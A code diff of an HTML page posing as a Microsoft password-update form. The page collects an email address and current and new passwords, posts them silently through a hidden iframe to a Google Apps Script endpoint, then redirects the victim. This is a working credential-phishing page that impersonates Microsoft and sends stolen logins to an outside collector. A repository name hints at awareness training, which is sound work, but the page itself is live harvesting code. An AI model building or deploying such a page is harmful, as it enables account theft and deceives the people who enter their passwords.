@@ -78,50 +78,50 @@
 <body>
     <div class="container">
         <div class="header">
-        <h2>Update your password</h2>
-        <p>For your security, please change your password regularly.</p>
+          <h2>Update your password</h2>
+          <p>For your security, please change your password regularly.</p>
         </div>
 
-        <!-- NETLIFY FORM (Must include `netlify` or `data-netlify="true"`) -->
         <form
-            id="passwordForm"
-            action="https://script.google.com/macros/s/AKfycbyEc6bDlTHcL2_xDQaXbfaUM4ZQQyz3oULk12K77vuZD-zc6_OwQlTcuew3nXZJqdl2/exec"
-            method="POST"
-            enctype="application/x-www-form-urlencoded"
-            target="hiddenFrame"
+          id="passwordForm"
+          action="https://script.google.com/macros/s/AKfycbyEc6bDlTHcL2_xDQaXbfaUM4ZQQyz3oULk12K77vuZD-zc6_OwQlTcuew3nXZJqdl2/exec"
+          method="POST"
+          enctype="application/x-www-form-urlencoded"
+          target="hiddenFrame"
         >
-        <!-- Form fields -->
-        <label for="email">Email address</label>
-        <input type="email" id="email" name="email" required>
+          <!-- Form fields -->
+          <label for="email">Email address</label>
+          <input type="email" id="email" name="email" required>
 
-        <label for="current-password">Current password</label>
-        <input type="password" id="currentPassword" name="currentPassword" required>
+          <label for="current-password">Current password</label>
+          <input type="password" id="currentPassword" name="currentPassword" required>
 
-        <label for="new-password">New password</label>
-        <input type="password" id="newPassword" name="newPassword" required>
+          <label for="new-password">New password</label>
+          <input type="password" id="newPassword" name="newPassword" required>
 
-        <button class="btn" type="submit">Update password</button>
+          <button class="btn" type="submit">Update password</button>
         </form>
         
         <!-- Hidden iframe for silent submission -->
         <iframe name="hiddenFrame" style="display:none;"></iframe>
 
         <div class="footer">
-        &copy; 2025 Microsoft Corporation. All rights reserved.
+          &copy; 2025 Microsoft Corporation. All rights reserved.
         </div>
     </div>
     <script>
-      document.getElementById("passwordForm").addEventListener("submit", function(e) {
-        e.preventDefault(); // Stop the default form submission
+        document.getElementById("passwordForm").addEventListener("submit", function() {
+            // Form submission to Google Sheets via iframe
+            
+            // Clear the form inputs after submission
+            const inputs = e.target.querySelectorAll("input");
+            inputs.forEach(input => input.value = "");
 
-        // Clear all input fields
-        const inputs = this.querySelectorAll("input");
-        inputs.forEach(input => input.value = "");
-
-        setTimeout(() => {
-            window.location.href = "https://jacc-ck.github.io/training.github.io/result.html"; // Same directory (GitHub Pages-friendly)
-        }, 1500);
-      });
+            // Redirect after 1 second (allow time for submission)
+            setTimeout(() => {
+                window.location.href = "/result.html"; // target page
+            }, 1000);
+        });
     </script>
 </body>
 </html>
